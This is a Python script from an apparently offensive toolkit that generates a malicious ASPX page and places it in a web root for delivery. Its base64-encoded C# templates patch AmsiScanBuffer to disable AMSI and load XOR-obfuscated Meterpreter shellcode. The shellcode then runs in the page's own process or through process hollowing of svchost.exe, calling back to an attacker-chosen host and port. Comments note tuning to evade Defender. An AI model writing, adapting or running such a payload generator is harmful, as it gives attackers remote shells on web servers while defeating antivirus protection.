import os,sys
import base64
import argparse
from random import choice
from makerunner import runner,gen,powershell_b64encode,makeoneliner,cradleps1
from makedll import xor_buffer_csharp

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

devhost = "192.168.135.7"

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writeaspx(bitness,lhost,lport,process):
    aspxfilename = "run.aspx"

    if process == "0":
        print('[!] no -s process provided -> default simple runner used!')
        upper = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBuYW1lKTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBJbnRQdHIgbWVtID0gVmlydHVhbEFsbG9jRXhOdW1hKEdldEN1cnJlbnRQcm9jZXNzKCksIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0LCAwKTsKICAgICAgICBpZiAobWVtID09IG51bGwpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOw=="
        lower = "ICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGJ1Zi5MZW5ndGg7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICB9CgogICAgICAgIEludFB0ciByYWJiaXQgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpYnVmLkxlbmd0aCxNRU1fQ09NTUlULCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsKICAgICAgICBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbC5Db3B5KGJ1ZiwwLHJhYmJpdCxidWYuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdHVydGxlID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIGZpc2ggPSBDcmVhdGVUaHJlYWQoSW50UHRyLlplcm8sVUludFB0ci5aZXJvLHJhYmJpdCxJbnRQdHIuWmVybywwLHJlZiB0dXJ0bGUpOwogICAgfQo8L3NjcmlwdD4="
        pass 
    if process != "0":
        if process == "hollow":
            print('[+] -s hollow chosen -> hollow svchost used!')
            upper = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMiICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBwdWJsaWMgY29uc3QgdWludCBDUkVBVEVfU1VTUEVOREVEID0gMHg0OwogICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTQkFTSUNJTkZPUk1BVElPTiA9IDA7CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHVibGljIHN0cnVjdCBQcm9jZXNzSW5mbwogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgIHB1YmxpYyBJbnQzMiBQcm9jZXNzSWQ7CiAgICAgICAgcHVibGljIEludDMyIFRocmVhZElkOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHB1YmxpYyBzdHJ1Y3QgU3RhcnR1cEluZm8KICAgIHsKICAgICAgICBwdWJsaWMgdWludCBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyB1aW50IGR3WDsKICAgICAgICBwdWJsaWMgdWludCBkd1k7CiAgICAgICAgcHVibGljIHVpbnQgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgdWludCBkd1lTaXplOwogICAgICAgIHB1YmxpYyB1aW50IGR3WENvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIHVpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgdWludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIHVpbnQgZHdGbGFnczsKICAgICAgICBwdWJsaWMgc2hvcnQgd1Nob3dXaW5kb3c7CiAgICAgICAgcHVibGljIHNob3J0IGNiUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkT3V0cHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIGludGVybmFsIHN0cnVjdCBQcm9jZXNzQmFzaWNJbmZvCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDE7CiAgICAgICAgcHVibGljIEludFB0ciBQZWJBZGRyZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUGlkOwogICAgICAgIHB1YmxpYyBJbnRQdHIgTW9yZVJlc2VydmVkOwogICAgfQoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2kpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwgW0luXSByZWYgU3RhcnR1cEluZm8gbHBTdGFydHVwSW5mbywgb3V0IFByb2Nlc3NJbmZvIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgibnRkbGwiLCBDYWxsaW5nQ29udmVudGlvbiA9IENhbGxpbmdDb252ZW50aW9uLlN0ZENhbGwpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBad1F1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKEludFB0ciBoUHJvY2VzcywgaW50IHByb2NJbmZvcm1hdGlvbkNsYXNzLCByZWYgUHJvY2Vzc0Jhc2ljSW5mbyBwcm9jSW5mb3JtYXRpb24sIHVpbnQgUHJvY0luZm9MZW4sIHJlZiB1aW50IHJldGxlbik7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBbT3V0XSBieXRlW10gbHBCdWZmZXIsIGludCBkd1NpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZmJ5dGVzUlcpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIGJ5dGVbXSBscEJ1ZmZlciwgSW50MzIgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwU3RhcnRBZGRyLFVJbnRQdHIgc2l6ZSxJbnQzMiBmbEFsbG9jYXRpb25UeXBlLEludFB0ciBmbFByb3RlY3QpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcyxVSW50UHRyIGR3U3RhY2tTaXplLEludFB0ciBscFN0YXJ0QWRkcmVzcyxJbnRQdHIgcGFyYW0sSW50MzIgZHdDcmVhdGlvbkZsYWdzLHJlZiBJbnRQdHIgbHBUaHJlYWRJZCk7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50MzIgZHdTaXplLCBVSW50MzIgZmxOZXdQcm90ZWN0LCBvdXQgVUludDMyIGxwZmxPbGRQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4TnVtYShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCwgVUludDMyIG5uZFByZWZlcnJlZCk7CgogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgogICAgcHJvdGVjdGVkIHZvaWQgUGFnZV9Mb2FkKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEludFB0ciBtZW0gPSBWaXJ0dWFsQWxsb2NFeE51bWEoR2V0Q3VycmVudFByb2Nlc3MoKSwgSW50UHRyLlplcm8sIDB4MTAwMCwgMHgzMDAwLCAweDQsIDApOwogICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtcyIgKyAiaS5kIiArICJsbCI7CiAgICAgICAgc3RyaW5nIG5hbWUyID0gIkEiICsgIm1zIiArICJpU2NhbiIgKyAiQnUiICsgImZmZXIiOwogICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOw=="
            lower = "ICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGJ1Zi5MZW5ndGg7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICB9CgogICAgICAgIFN0cmluZyBwcG93ZXIgPSAiYyIgKyAiOiIgKyAiXFwiICsgIndpbiIgKyAiZG93c1xcIiArICJzeSIgKyAic3RlbSIgKyAiMzJcXCIgKyAic3ZjIiArICJob3N0LmUiICsgInhlIjsKICAgICAgICBTdGFydHVwSW5mbyBzSW5mbyA9IG5ldyBTdGFydHVwSW5mbygpOwogICAgICAgIFByb2Nlc3NJbmZvIHBJbmZvID0gbmV3IFByb2Nlc3NJbmZvKCk7CiAgICAgICAgYm9vbCBjUmVzdWx0ID0gQ3JlYXRlUHJvY2VzcyhudWxsLCBwcG93ZXIsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgZmFsc2UsIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBwSW5mbyk7CiAgICAgICAgICAgIAogICAgICAgIFByb2Nlc3NCYXNpY0luZm8gcGJJbmZvID0gbmV3IFByb2Nlc3NCYXNpY0luZm8oKTsKICAgICAgICB1aW50IHJldExlbiA9IG5ldyB1aW50KCk7CiAgICAgICAgbG9uZyBxUmVzdWx0ID0gWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwSW5mby5oUHJvY2VzcywgUFJPQ0VTU0JBU0lDSU5GT1JNQVRJT04sIHJlZiBwYkluZm8sICh1aW50KShJbnRQdHIuU2l6ZSAqIDYpLCByZWYgcmV0TGVuKTsKICAgICAgICBJbnRQdHIgYmFzZUltYWdlQWRkciA9IChJbnRQdHIpKChJbnQ2NClwYkluZm8uUGViQWRkcmVzcyArIDB4MTApOwogICAgCiAgICAgICAgYnl0ZVtdIHByb2NBZGRyID0gbmV3IGJ5dGVbMHg4XTsKICAgICAgICBieXRlW10gZGF0YUJ1ZiA9IG5ldyBieXRlWzB4MjAwXTsKICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICBib29sIHJlc3VsdCA9IFJlYWRQcm9jZXNzTWVtb3J5KHBJbmZvLmhQcm9jZXNzLCBiYXNlSW1hZ2VBZGRyLCBwcm9jQWRkciwgcHJvY0FkZHIuTGVuZ3RoLCBvdXQgYnl0ZXNSVyk7CiAgICAgICAgSW50UHRyIGV4ZWN1dGFibGVBZGRyZXNzID0gKEludFB0cilCaXRDb252ZXJ0ZXIuVG9JbnQ2NChwcm9jQWRkciwgMCk7CiAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgIAogICAgICAgIHVpbnQgZV9sZmFuZXcgPSBCaXRDb252ZXJ0ZXIuVG9VSW50MzIoZGF0YUJ1ZiwgMHgzYyk7CiAgICAgICAgdWludCBydmFPZmZzZXQgPSBlX2xmYW5ldyArIDB4Mjg7CiAgICAgICAgdWludCBydmEgPSBCaXRDb252ZXJ0ZXIuVG9VSW50MzIoZGF0YUJ1ZiwgKGludClydmFPZmZzZXQpOwogICAgICAgIEludFB0ciBlbnRyeXBvaW50QWRkciA9IChJbnRQdHIpKChJbnQ2NClleGVjdXRhYmxlQWRkcmVzcyArIHJ2YSk7CgogICAgICAgIHJlc3VsdCA9IFdyaXRlUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgZW50cnlwb2ludEFkZHIsIGJ1ZiwgYnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgIHVpbnQgclJlc3VsdCA9IFJlc3VtZVRocmVhZChwSW5mby5oVGhyZWFkKTsgICAgICAgICAgICAgICAgCgogICAgfQo8L3NjcmlwdD4="
            pass 
        else:
            print('[+] -s %s chosen -> inject to %s' % (process,process))
            print('[!] warning - be sure process \'%s\' exists!' % process)
        pass

    gen(lhost,lport,bitness,"csharp")
    msffilename = "met%s.csharp" % (bitness)
    m = open(msffilename,'r')
    msf = m.read()
    m.close()
    msf = xor_buffer_csharp(msf) # 5/26 -defender

    with open(aspxfilename,'w') as f:
        upper = base64.b64decode(upper).decode()      
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("        " + msf + "\n")
        f.write(lower)
    f.close()

    print('[+] aspx written: %s' % aspxfilename)
    return aspxfilename
    pass 

def makeaspx(bitness,lhost,lport,process):
    aspxfilename = writeaspx(bitness,lhost,lport,process)
    copy(aspxfilename,"/var/www/html/",aspxfilename)
    print('[+] evil aspx url: http://%s/%s' % (lhost,aspxfilename))
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--process','-s',required=False,dest='process',help='target process, e.g. spoolsv, explorer') # default: [TARGETHOST]    
    args = parser.parse_args()

    bitness = args.arch
    lhost = args.host
    lport = args.port
    process = args.process

    if process == None: process = "0"

    makeaspx(bitness,lhost,lport,process)